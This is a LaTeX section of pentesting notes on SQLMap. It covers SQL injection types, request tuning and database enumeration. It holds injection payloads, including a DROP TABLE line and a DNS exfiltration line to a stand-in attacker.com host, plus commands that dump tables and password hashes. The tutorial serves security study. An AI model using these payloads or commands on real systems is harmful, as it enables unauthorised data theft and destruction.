\section{SQLMap}
\label{tool:sqlmap}

\subsection*{Introduction}

\href{https://github.com/sqlmapproject/sqlmap}{SQLMap} is a free and
open-source penetration testing tool written in Python that automates the
process of detecting and exploiting SQL injection (SQLi) flaws. 

\subsection*{Supported SQL injection types}

\begin{verbatim}
sqlmap -hh
\end{verbatim}

\subsubsection*{Boolean-based blind SQL injection}

\verb+AND 1=1+

SQLMap exploits Boolean-based blind SQL Injection vulnerabilities through the
differentiation of TRUE from FALSE query results, effectively retrieving 1 byte
of information per request. The differentiation is based on comparing server
responses to determine whether the SQL query returned TRUE or FALSE. This
ranges from fuzzy comparisons of raw response content, HTTP codes, page titles,
filtered text, and other factors.

\begin{itemize}
    \item TRUE results are generally based on responses having none or marginal
        difference to the regular server response.
    \item FALSE results are based on responses having substantial differences
        from the regular server response.
\end{itemize}

Boolean-based blind SQL Injection is considered as the {\bf most common} SQLi
type in web applications.

\subsubsection*{Error-based SQL injection}


\verb+AND GTID_SUBSET(@@version,0)+

If the database management system (DBMS) errors are being returned as part of
the server response for any database-related problems, then there is a
probability that they can be used to carry the results for requested queries.
In such cases, specialized payloads for the current DBMS are used, targeting
the functions that cause known misbehaviors. SQLMap has the most comprehensive
list of such related payloads and covers Error-based SQL Injection for the
following DBMSes:

\begin{tabular}{lll}
MySQL &	PostgreSQL &	Oracle \\
Microsoft SQL Server &	Sybase 	& Vertica \\
IBM DB2 &	Firebird &	MonetDB \\
\end{tabular}

Error-based SQLi is considered as {\bf faster than all other types, except
UNION query-based }, because it can retrieve a limited amount (e.g., 200 bytes)
of data called "chunks" through each request.

\subsubsection*{UNION query-based}
\verb+UNION ALL SELECT 1,@@version,3+

With the usage of UNION, it is generally possible to extend the original
(vulnerable) query with the injected statements' results. This way, if the
original query results are rendered as part of the response, the attacker can
get additional results from the injected statements within the page response
itself. 

This type of SQL injection is considered the fastest, as, in the ideal
scenario, the attacker would be able to pull the content of the whole database
table of interest with a single request.


\subsubsection*{Stacked queries}

\verb+; DROP TABLE users+

Stacking SQL queries, also known as the "piggy-backing," is the form of
injecting additional SQL statements after the vulnerable one. In case that
there is a requirement for running non-query statements (e.g. INSERT, UPDATE or
DELETE), stacking must be supported by the vulnerable platform (e.g., Microsoft
SQL Server and PostgreSQL support it by default). SQLMap can use such
vulnerabilities to run non-query statements executed in advanced features
(e.g., execution of OS commands) and data retrieval similarly to time-based
blind SQLi types.

\subsubsection*{Time-based blind SQL injection}

\verb+AND 1=IF(2>1,SLEEP(5),0)+

The principle of Time-based blind SQL Injection is similar to the Boolean-based
blind SQL Injection, but here the response time is used as the source for the
differentiation between TRUE or FALSE.
\begin{itemize}
    \item TRUE response is generally characterized by the noticeable difference
        in the response time compared to the regular server response
    \item FALSE response should result in a response time indistinguishable
        from regular response times
\end{itemize}

Time-based blind SQL Injection is considerably slower than the boolean-based
blind SQLi, since queries resulting in TRUE would delay the server response.
This SQLi type is used in cases where Boolean-based blind SQL Injection is not
applicable. For example, in case the vulnerable SQL statement is a non-query
(e.g. INSERT, UPDATE or DELETE), executed as part of the auxiliary
functionality without any effect to the page rendering process, time-based SQLi
is used out of the necessity, as Boolean-based blind SQL Injection would not
really work in this case.

\subsubsection*{Inline queries}
\verb+SELECT (SELECT @@version) from+

This type of injection embedded a query within the original query. Such SQL
injection is uncommon, as it needs the vulnerable web app to be written in a
certain way. Still, SQLMap supports this kind of SQLi as well.

\subsubsection*{Out-of-band SQL injection}

\verb+LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))+

This is considered one of the most advanced types of SQLi, used in cases where
all other types are either unsupported by the vulnerable web application or are
too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi
through "DNS exfiltration," where requested queries are retrieved through DNS
traffic.

By running the SQLMap on the DNS server for the domain under control (e.g.
.attacker.com), SQLMap can perform the attack by forcing the server to request
non-existent subdomains (e.g. foo.attacker.com), where foo would be the SQL
response we want to receive. SQLMap can then collect these erroring DNS
requests and collect the foo part, to form the entire SQL response.



\subsection*{Building attacks}
\subsubsection*{Set up an SQLMap request}

One of the best and easiest ways to properly set up an SQLMap request against
the specific target (i.e., web request with parameters inside) is by utilizing
Copy as cURL feature from within the Network (Monitor) panel inside web browser

When providing data for testing to SQLMap, there has to be either a parameter
value that could be assessed for SQLi vulnerability or specialized
options/switches for automatic parameter finding (e.g. \verb+--crawl+,
    \verb+--forms+ or \verb+-g+).

\subsubsection*{GET/POST requests}

In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:

\begin{verbatim}
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
\end{verbatim}


In such cases, POST parameters uid and name will be tested for SQLi
vulnerability. For example, if we have a clear indication that the parameter
uid is prone to an SQLi vulnerability, we could narrow down the tests to only
this parameter using \verb+-p uid+. Otherwise, we could mark it inside the provided
data with the usage of special marker \verb+*+ as follows:

\begin{verbatim}
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
\end{verbatim}

\subsubsection*{Full HTTP Requests}
If we need to specify a complex HTTP request with lots of different header
values and an elongated POST body, we can use the i\verb+-r+ flag. With this option,
SQLMap is provided with the "request file," containing the whole HTTP request
inside a single textual file. In a common scenario, such HTTP request can be
captured from within a specialized proxy application (e.g. Burp) and written
into the request file.
\begin{verbatim}
sqlmap -r req.txt
\end{verbatim}

\subsubsection*{Custom SQLMap Requests}

While SQLMap, by default, targets only the HTTP parameters, it is possible to
test the headers for the SQLi vulnerability. The easiest way is to specify the
"custom" injection mark after the header's value (e.g. \verb+--cookie="id=1*"+). The
same principle applies to any other part of the request.


\subsection*{Attack tuning}

There are options to fine-tune the SQLi injection attempts to help SQLMap in
the detection phase. Every payload sent to the target consists of:
\begin{itemize}
    \item vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the
        payload, carrying the useful SQL code to be executed at the target.
    \item  boundaries (e.g. '<vector>-- -): prefix and suffix formations, used
        for proper injection of the vector into the vulnerable SQL statement.
\end{itemize}


\subsubsection*{Prefix/Suffix}
There is a requirement for special prefix and suffix values in rare cases, not
covered by the regular SQLMap run.

For such runs, options \verb+--prefix+ and \verb+--suffix+ can be used as follows:

\begin{verbatim}
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
\end{verbatim}

This will result in an enclosure of all vector values between the static prefix
\verb+%'))+ and the suffix \verb+-- -+.

For example, if the vulnerable code at the target is:
\begin{verbatim}
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . \
            "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
\end{verbatim}

The vector \verb+UNION ALL SELECT 1,2,VERSION()+, bounded with the prefix
\verb+%'))+ and the suffix \verb+-- -+, will result in the following (valid SQL
statement at the target:

\begin{verbatim}
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) \
        UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
\end{verbatim}


\subsubsection*{Level/Risk}

By default, SQLMap combines a predefined set of most common boundaries (i.e.,
prefix/suffix pairs), along with the vectors having a high chance of success in
case of a vulnerable target. Nevertheless, there is a possibility for users to
use bigger sets of boundaries and vectors, already incorporated into the
SQLMap.

For such demands, the options \verb+--level+ and \verb+--risk+ should be used:
\begin{itemize}
    \item The option \verb+--level+ (1-5, default 1) extends both vectors and
        boundaries being used, based on their expectancy of success (i.e., the
        lower the expectancy, the higher the level).
    \item The option \verb+--risk+ (1-3, default 1) extends the used vector set based
        on their risk of causing problems at the target side (i.e., risk of
        database entry loss or denial-of-service).
\end{itemize}

The best way to check for differences between used boundaries and payloads for
different values of \verb+--level+ and \verb+--risk+, is the usage of \verb+-v+
option to set the verbosity level. 


As for the number of payloads, by default (i.e. \verb+--level=1 --risk=1+), the
number of payloads used for testing a single parameter goes up to 72, while in
the most detailed case (\verb+--level=5 --risk=3+) the number of payloads
increases to 7,865.

As SQLMap is already tuned to check for the most common boundaries and vectors,
regular users are advised not to touch these options because it will make the
whole detection process considerably slower. Nevertheless, in special cases of
SQLi vulnerabilities, where usage of {\bf OR payloads is a must (e.g., in case
of login pages)}, we may have to raise the risk level ourselves.

This is because OR payloads are inherently dangerous in a default run, where
underlying vulnerable SQL statements (although less commonly) are actively
modifying the database content (e.g. DELETE or UPDATE).

\subsubsection*{Advanced tuning}

{\bf Status Codes}:  when dealing with a huge target response with a lot of
dynamic content, subtle differences between TRUE and FALSE responses could be
used for detection purposes. If the difference between TRUE and FALSE responses
can be seen in the HTTP codes (e.g. 200 for TRUE and 500 for FALSE), the option
--code could be used to fixate the detection of TRUE responses to a specific
HTTP code (e.g. \verb+--code=200+).

{\bf Titles}: If the difference between responses can be seen by inspecting the
HTTP page titles, the switch \verb+--titles+ could be used to instruct the
detection mechanism to base the comparison based on the content of the HTML tag
\verb+<title>+.

{\bf Strings}: in case of a specific string value appearing in TRUE responses
(e.g. success), while absent in FALSE responses, the option \verb+--string+
could be used to fixate the detection based only on the appearance of that
single value (e.g. \verb+--string=success+).

{\bf Text-only}: when dealing with a lot of hidden content, such as certain
HTML page behaviors tags (e.g. \verb+<script>+, \verb+<style>+, \verb+<meta>+,
\ldots), we can use the \verb+--text-only+ switch, which removes all the HTML
tags, and bases the comparison only on the textual (i.e., visible) content.

{\bf Techniques}: in some special cases, we have to narrow down the used
payloads only to a certain type. For example, if the time-based blind payloads
are causing trouble in the form of response timeouts, or if we want to force
the usage of a specific SQLi payload type, the option \verb+--technique+ can
specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads
and only test for the boolean-based blind, error-based, and UNION-query
payloads, we can specify these techniques with \verb+--technique=BEU+.

{\bf UNION SQLi Tuning}: in some cases, UNION SQLi payloads require extra
user-provided information to work. If we can manually find the exact number of
columns of the vulnerable SQL query, we can provide this number to SQLMap with
the option \verb+--union-cols+ (e.g. \verb+--union-cols=17+). In case that the
default "dummy" filling values used by SQLMap \verb+-NULL+ and random integer-
are not compatible with values from results of the vulnerable SQL query, we can
specify an alternative value instead (e.g. \verb+--union-char='a'+).

Furthermore, in case there is a requirement to use an appendix at the end of a
UNION query in the form of the FROM <table> (e.g., in case of Oracle), we can
set it with the option \verb+--union-from+ (e.g. \verb+--union-from=users+).

Failing to use the proper FROM appendix automatically could be due to the
inability to detect the DBMS name before its usage.

\subsection*{Database enumeration}
\subsubsection*{Data exfiltation}

For such purpose, SQLMap has a predefined set of queries for all supported
DBMSes, where each entry represents the SQL that must be run at the target to
retrieve the desired content. For example, the excerpts from
\href{https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml}{queries.xml}
for a MySQL DBMS

\subsubsection*{Basic data enumeration}
Usually, after a successful detection of an SQLi vulnerability, we can begin
the enumeration of basic details from the database, such as the hostname of the
vulnerable target (\verb+--hostname+), current user's name
(\verb+--current-user+), current database name (\verb+--current-db+), or
password hashes (\verb+--passwords+). SQLMap will skip SQLi detection if it has
been identified earlier and directly start the DBMS enumeration process.

\subsubsection*{Table enumeration}

\begin{verbatim}
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
\end{verbatim}

When dealing with large tables with many columns and/or rows, we can specify
the columns with the \verb+-C+ option

\begin{verbatim}
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
\end{verbatim}

To narrow down the rows based on their ordinal number(s) inside the table, we
can specify the rows with the \verb+--start+ and \verb+--stop+ options (e.g., start from 2nd
up to 3rd entry)


\begin{verbatim}
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 \
    --stop=3
\end{verbatim}

 there is a requirement to retrieve certain rows based on a known WHERE
 condition, we can use the option \verb+--where+

\begin{verbatim}
qlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb \
        --where="name LIKE 'f%'
\end{verbatim}

\subsubsection*{Full enumeration}
Instead of retrieving content per single-table basis, we can retrieve all
tables inside the database of interest by skipping the usage of option
\verb+-T+ altogether (e.g. \verb+--dump -D testdb+). By simply using the switch
\verb+--dump+ without specifying a table, all of the current database content
will be retrieved. As for the \verb+--dump-all+ switch, all the content from
all the databases will be retrieved.

In such cases, a user is also advised to include the switch
\verb+--exclude-sysdbs+, which will instruct SQLMap to skip the retrieval of
content from system databases, as it is usually of little interest for
pentesters.

\subsubsection*{Schema enumeration}
\begin{verbatim}
sqlmap -u "http://www.example.com/?id=1" --schema
\end{verbatim}

\subsubsection*{Search}

When dealing with complex database structures with numerous tables and columns,
we can search for databases, tables, and columns of interest, by using the
\verb+--search+ option. This option enables us to search for identifier names by using
the LIKE operator. For example, if we are looking for all of the table names
containing the keyword user, we can run SQLMap as follows:a
\begin{verbatim}
sqlmap -u "http://www.example.com/?id=1" --search -T user
\end{verbatim}

we could also have tried to search for all column names based on a specific keyword 

\begin{verbatim}
sqlmap -u "http://www.example.com/?id=1" --search -C pass
\end{verbatim}


\subsubsection*{Password Enumeration and Cracking}

We can see in the previous example that SQLMap has automatic password hashes
cracking capabilities. Upon retrieving any value that resembles a known hash
format, SQLMap prompts us to perform a dictionary-based attack on the found
hashes.

Apart from user credentials found in DB tables, we can also attempt to dump the
content of system tables containing database-specific credentials (e.g.,
connection credentials). To ease the whole process, SQLMap has a special switch
\verb+--passwords+ designed especially for such a task

\subsection*{Common usages}

\subsubsection*{Script kiddy}
\begin{verbatim}
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
\end{verbatim}

\subsection*{options}

\subsubsection*{General options}
\begin{itemize}
    \item \verb+--batch+: no user interaction
    \item \verb+--dump+: dump all data
\end{itemize}


\subsubsection*{Errors options}

\begin{itemize}
    \item \verb+--parse-errors+: parse the DBMS errors
    \item \verb+-t <file>+: stores the traffic in a file
    \item \verb+-v <int>+: verbositu level
    \item \verb+--proxy+
\end{itemize}


